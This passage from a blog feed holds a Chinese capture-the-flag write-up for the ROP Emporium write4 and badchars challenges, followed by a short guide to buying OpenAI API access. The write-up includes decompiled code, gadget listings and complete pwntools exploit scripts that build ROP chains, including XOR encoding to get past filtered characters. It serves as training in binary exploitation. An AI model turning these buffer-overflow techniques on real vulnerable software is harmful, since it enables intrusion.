-
-<h2 id="0x04-write4"><a href="#0x04-write4" class="headerlink" title="0x04 write4"></a>0x04 write4</h2><blockquote>
-<p><strong>Important!</strong></p>
-<p>A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like “flag.txt”) as the 1st argument.</p>
-</blockquote>
-<p>提供了<code>print_file()</code>函数，可以打印flag</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">print_file</span><span class="params">(<span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">33</span>]; <span class="comment">// [esp+Bh] [ebp-2Dh] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>寻找<code>gadget</code>写字符串</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ./write432 --only <span class="string">&quot;mov|ret|pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080484e7 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class="line">0x08048543 : mov dword ptr [edi], ebp ; ret</span><br><span class="line">0x08048381 : mov ebx, 0x81000000 ; ret</span><br><span class="line">0x08048423 : mov ebx, dword ptr [esp] ; ret</span><br><span class="line">0x080485ab : pop ebp ; ret</span><br><span class="line">0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804839d : pop ebx ; ret</span><br><span class="line">0x080485aa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048386 : ret</span><br><span class="line">0x0804849e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>0x08048543 : mov dword ptr [edi], ebp ;</p>
-</li>
-<li><p>0x080485aa : pop edi ; pop ebp ; ret</p>
-</li>
-</ul>
-<p>poc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p: locat process, r: remote process</span></span><br><span class="line">p = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:08048538                 call    _print_file</span></span><br><span class="line"><span class="comment"># 想办法写一个flag.txt到内存,32位4字节对齐</span></span><br><span class="line">print_file_plt = elf.plt.print_file</span><br><span class="line">bss_addr = p32(elf.bss())</span><br><span class="line">pop_edi_ebp = p32(<span class="number">0x080485aa</span>)</span><br><span class="line">mov_edi_ebp = p32(<span class="number">0x08048543</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stage1: write flag.txt to bss</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += pop_edi_ebp + bss_addr + <span class="string">b&#x27;flag&#x27;</span> + mov_edi_ebp</span><br><span class="line">payload += pop_edi_ebp + p32(elf.bss() + <span class="number">4</span>) + <span class="string">b&#x27;.txt&#x27;</span> + mov_edi_ebp</span><br><span class="line"></span><br><span class="line"><span class="comment"># stage2: call print_file</span></span><br><span class="line">payload += p32(<span class="number">0x08048538</span>) + bss_addr</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-badchars"><a href="#0x05-badchars" class="headerlink" title="0x05 badchars"></a>0x05 badchars</h2><p>黑名单过滤特殊字符</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>思路与write4差不多，不过需要首先处理输入字符的问题。思路：使用<code>xor</code>处理字符，并利用<code>xor指令</code>还原字符</p>
-<p><strong>xor指令</strong></p>
-<blockquote>
-<p>XOR 指令在两个操作数的对应位之间进行（按位）逻辑异或（XOR）操作，并将结果存放在<strong>目标操作数</strong>中：</p>
-<p>XOR <strong>destination</strong>, source</p>
-</blockquote>
-<p>poc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义使用的Gadget和函数地址</span></span><br><span class="line">pop_esi_edi_ebp = <span class="number">0x080485B9</span></span><br><span class="line">mov_edi_esi = <span class="number">0x0804854F</span></span><br><span class="line">pop_ebp = <span class="number">0x080485BB</span></span><br><span class="line">pop_ebx = <span class="number">0x0804839D</span></span><br><span class="line">xor_ebp_bl = <span class="number">0x08048547</span></span><br><span class="line">print_file_plt = elf.plt[<span class="string">&quot;print_file&quot;</span>]</span><br><span class="line">data_addr = elf.bss()</span><br><span class="line">xor_byte = <span class="number">0x16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义绕过badchars的xor编码函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encode</span>(<span class="params">xor_byte</span>):</span><br><span class="line">    badchars = [<span class="string">&quot;x&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;.&quot;</span>]</span><br><span class="line">    flag = <span class="string">&quot;flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        encoded_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        index = []</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> badchars:</span><br><span class="line">                encoded_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ xor_byte)</span><br><span class="line">                <span class="keyword">if</span> encoded_char <span class="keyword">in</span> badchars:</span><br><span class="line">                    xor_byte += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    index.append(flag.index(char))</span><br><span class="line">                    encoded_flag += encoded_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encoded_flag += char</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(encoded_flag) == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_flag, index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成编码后的flag和需要解码的位置</span></span><br><span class="line">flag_file, index = xor_encode(xor_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建payload写入编码后的flag到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">44</span></span><br><span class="line">payload += (</span><br><span class="line">    p32(pop_esi_edi_ebp)</span><br><span class="line">    + flag_file[:<span class="number">4</span>].encode()</span><br><span class="line">    + p32(data_addr)</span><br><span class="line">    + <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">    + p32(mov_edi_esi)</span><br><span class="line">)</span><br><span class="line">payload += (</span><br><span class="line">    p32(pop_esi_edi_ebp)</span><br><span class="line">    + flag_file[<span class="number">4</span>:].encode()</span><br><span class="line">    + p32(data_addr + <span class="number">4</span>)</span><br><span class="line">    + <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">    + p32(mov_edi_esi)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加xor解码指令到payload</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    payload += (</span><br><span class="line">        p32(pop_ebp)</span><br><span class="line">        + p32(data_addr + i)</span><br><span class="line">        + p32(pop_ebx)</span><br><span class="line">        + p32(xor_byte)</span><br><span class="line">        + p32(xor_ebp_bl)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加调用print_file函数的指令到payload</span></span><br><span class="line">payload += p32(print_file_plt) + <span class="string">b&quot;AAAA&quot;</span> + p32(data_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并接收输出</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvall()</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lonmar.cn/2022/03/09/ret2csu/">https://lonmar.cn/2022/03/09/ret2csu/</a></p>
-]]></content>
-      <tags>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OpenAI APIKey申请教程</title>
-    <url>/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><code>GPT-4o</code>发布后，默认的账户可以限时使用了。在一次的问题提问过程中，发现确实要比<code>GPT-3.5</code>效果好不少，于是决定购买一些API的使用量。</p>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>需要一张可支付的卡。我使用了WildCard: <a href="https://wildcard.com.cn/">https://wildcard.com.cn</a> , 根据教程以及说明充值开通即可。需要注意的是，提前充值<code>10$</code>以上，以及开启OpenAI的自动续费。</p>
-<p>使用我的邀请码（<strong>可以减免2美金</strong>）：JKSGOPF7</p>
-<h2 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h2><p>使用中，发现<code>User APIkeys</code>可以完美，但是<code>Project APIkeys</code>提示不正确</p>
-<p>价格对比，相对性价比较高的模型</p>
-<table>
-<thead>
-<tr>
-<th>Model</th>
-<th>Input</th>
-<th>Output</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>gpt-3.5-turbo</td>
-<td>US$3.00 &#x2F; 1M tokens</td>
-<td>US$6.00 &#x2F; 1M tokens</td>
-</tr>
-<tr>
-<td>gpt-4o</td>
-<td>US$5.00 &#x2F; 1M tokens</td>
-<td>US$15.00 &#x2F; 1M tokens</td>
-</tr>
-<tr>
-<td>gpt-4-turbo</td>
-<td>US$10.00 &#x2F; 1M tokens</td>
-<td>US$30.00 &#x2F; 1M tokens</td>
-</tr>
-<tr>
-<td>gpt-4</td>
-<td>US$30.00 &#x2F; 1M tokens</td>
-<td>US$60.00 &#x2F; 1M tokens</td>
-</tr>
-</tbody></table>
-<p>记得关注使用情况</p>
-<p><a href="https://platform.openai.com/usage">https://platform.openai.com/usage</a></p>
-<p><img src="/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/2024-06-01-13-21-45-image.png"></p>
-<h3 id="命令行使用"><a href="#命令行使用" class="headerlink" title="命令行使用"></a>命令行使用</h3><p>使用<code>ShellGPT</code>开源项目</p>
-<ul>
-<li><a href="https://github.com/TheR1D/shell_gpt">GitHub - TheR1D&#x2F;shell_gpt: A command-line productivity tool powered by AI large language models like GPT-4, will help you accomplish your tasks faster and more efficiently.</a></li>
-</ul>
-<p>依旧强大，可以在<code>~/.config/shell_gpt/.sgptrc</code>修改模型以及使用的key</p>
-<p><img src="/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/2024-06-01-13-23-50-image.png"></p>
-]]></content>
-      <tags>
-        <tag>效率</tag>
       </tags>
   </entry>
 </search>
